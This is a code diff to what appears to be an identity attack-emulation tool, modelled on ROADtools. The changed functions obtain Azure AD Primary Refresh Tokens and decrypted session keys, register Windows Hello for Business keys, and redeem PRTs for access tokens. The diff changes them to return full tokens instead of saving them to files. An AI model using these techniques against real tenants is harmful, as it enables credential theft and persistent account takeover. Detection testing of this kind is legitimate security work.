@@ -353,33 +353,19 @@ def get_prt_with_refresh_token(params):
 		logging.error(f"Failed to decrypt session key: {e}")
 		return
 
-	# Determine output path
-	prt_out = params.get("prt_out", f"{device_id}_prt.json")
+	output = {
+		"device_id": device_id,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+	}
 
-	# Write PRT components to output file
-	try:
-		output = {
-			"device_id": device_id,
-			"session_key": base64.b64encode(session_key).decode('utf-8'),  # Save decrypted and encoded
-			"tgt_ad": tgt_ad,
-			"tgt_cloud": tgt_cloud,
-			"refresh_token": refresh_token,
-			"id_token": result.get("id_token"),
-			"obtained_at": datetime.utcnow().isoformat(),
-			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
-		}
-
-		with open(prt_out, "w") as f:
-			json.dump(output, f, indent=2)
-
-		logging.info(f"Successfully obtained PRT for device {device_id}")
-		logging.info(f"PRT and decrypted session key saved to {prt_out}")
-
-		return output
-
-	except Exception as e:
-		logging.error(f"Failed to write PRT output to {prt_out}: {e}")
-		return
+	logging.info(f"Successfully obtained PRT for device {device_id}")
+	return output
 
 def _calculate_derived_key_v2(session_key, context, jwtbody):
 	"""
@@ -539,12 +525,6 @@ def create_whfb_key(params):
 	"""
 	logging.info("Running the create_whfb_key technique")
 
-	session = params.get("session", "nosession")
-	if session == "nosession":
-		logging.error("session parameter is required")
-		return
-
-	# Get access token from session (passed by main orchestrator)
 	access_token = params.get("access_token")
 	if not access_token:
 		logging.error("access_token is required to register Windows Hello key")
@@ -644,47 +624,34 @@ def get_token_with_prt(params):
 	Based on ROADtools aad_brokerplugin_prt_auth pattern:
 	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037
 
-	1. Load PRT and session key from disk
-	2. Get nonce from srv_challenge
+	1. Get nonce from srv_challenge
 	3. Create JWT payload signed with derived key
 	4. Submit to token endpoint
 	5. Decrypt response to extract access token
 
 	Parameters:
-		prt_file: Path to saved PRT file (from request_prt)
+		prt: Primary Refresh Token (the PRT refresh_token) to redeem
+		session_key: base64 decrypted PRT session key
 		client_id: Client ID to request token for
 		resource: Resource/scope to request access to
 		tenant_id: Tenant ID
-		token_out: Output file for token (optional)
 	"""
 	logging.info("Running the get_token_with_prt technique")
 
-	prt_file = params.get("prt_file")
+	prt = params.get("prt")
+	session_key_b64 = params.get("session_key")
 	client_id = params.get("client_id")
 	resource = params.get("resource")
 	tenant_id = params.get("tenant_id", "common")
-	token_out = params.get("token_out", "token_with_prt.json")
 
-	if not all([prt_file, client_id, resource]):
-		logging.error("prt_file, client_id, and resource parameters are required")
+	if not all([prt, session_key_b64, client_id, resource]):
+		logging.error("prt, session_key, client_id, and resource parameters are required")
 		return
 
-	# Step 1: Load PRT and decrypted session key from disk
 	try:
-		with open(prt_file, "r") as f:
-			prt_data = json.load(f)
-		prt = prt_data.get("refresh_token")
-		session_key_b64 = prt_data.get("session_key")
-
-		if not prt or not session_key_b64:
-			logging.error("PRT file missing refresh_token or session_key")
-			return
-
-		# Decode the base64-encoded session key
 		session_key = base64.b64decode(session_key_b64)
-		logging.info(f"Loaded PRT from {prt_file}")
 	except Exception as e:
-		logging.error(f"Failed to load PRT: {e}")
+		logging.error(f"Failed to decode session_key: {e}")
 		return
 
 	# Step 2: Request nonce from srv_challenge
@@ -800,18 +767,9 @@ def get_token_with_prt(params):
 			output["access_token"] = response_data['access_token']
 			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
 
-		# Extract other useful tokens
 		for key in ['refresh_token', 'id_token', 'expires_in']:
 			if key in response_data:
-				if key == 'refresh_token':
-					output[key] = response_data[key][:50] + "..." if len(response_data[key]) > 50 else response_data[key]
-				else:
-					output[key] = response_data[key]
-
-		with open(token_out, "w") as f:
-			json.dump(output, f, indent=2)
-
-		logging.info(f"Token response saved to {token_out}")
+				output[key] = response_data[key]
 
 		return output
 
@@ -831,12 +789,11 @@ def get_prt_with_whfb_key(params):
 	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L242
 
 	Parameters:
-		whfb_key_file: Path to saved Windows Hello private key file
+		whfb_key_path: Path to saved Windows Hello private key file
 		key_path: Path to device private key (for signing token request)
 		cert_path: Path to device certificate (for token request headers)
 		username: Username for JWT assertion (typically user@domain)
 		tenant_id: Tenant ID
-		prt_out: Output file for PRT (optional)
 
 	Returns:
 		Dictionary with PRT and session key details
@@ -844,21 +801,20 @@ def get_prt_with_whfb_key(params):
 	logging.info("Running the get_prt_with_whfb_key technique")
 
 	# Load parameters
-	whfb_key_file = params.get("whfb_key_file")
+	whfb_key_path = params.get("whfb_key_path")
 	key_path = params.get("key_path")
 	cert_path = params.get("cert_path")
 	username = params.get("username")
 	tenant_id = params.get("tenant_id", "common")
-	prt_out = params.get("prt_out", "whfb_prt.json")
 
-	if not all([whfb_key_file, key_path, cert_path, username]):
-		logging.error("whfb_key_file, key_path, cert_path, and username parameters are required")
+	if not all([whfb_key_path, key_path, cert_path, username]):
+		logging.error("whfb_key_path, key_path, cert_path, and username parameters are required")
 		return
 
 	# Step 1: Load Windows Hello for Business private key
 	logging.debug("Step 1: Loading Windows Hello for Business private key")
 	try:
-		with open(whfb_key_file, "rb") as f:
+		with open(whfb_key_path, "rb") as f:
 			whfb_key_pem = f.read()
 		whfb_key = serialization.load_pem_private_key(
 			whfb_key_pem,
@@ -1084,28 +1040,18 @@ def get_prt_with_whfb_key(params):
 		logging.error(f"Failed to decrypt session key: {e}")
 		return
 
-	try:
-		output = {
-			"device_id": username,
-			"session_key": base64.b64encode(session_key).decode('utf-8'),
-			"tgt_ad": tgt_ad,
-			"tgt_cloud": tgt_cloud,
-			"refresh_token": refresh_token,
-			"id_token": result.get("id_token"),
-			"obtained_at": datetime.utcnow().isoformat(),
-			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
-			"authentication_method": "Windows Hello for Business"
-		}
+	output = {
+		"device_id": username,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+		"authentication_method": "Windows Hello for Business"
+	}
 
-		with open(prt_out, "w") as f:
-			json.dump(output, f, indent=2)
-
-		logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
-		logging.info(f"PRT and decrypted session key saved to {prt_out}")
-		logging.info(f"[DETECTION] Obtained PRT using Windows Hello for Business key for {username}")
-
-		return output
-
-	except Exception as e:
-		logging.error(f"Failed to write PRT output: {e}")
-		return
+	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
+	logging.info(f"[DETECTION] Obtained PRT using Windows Hello for Business key for {username}")
+	return output
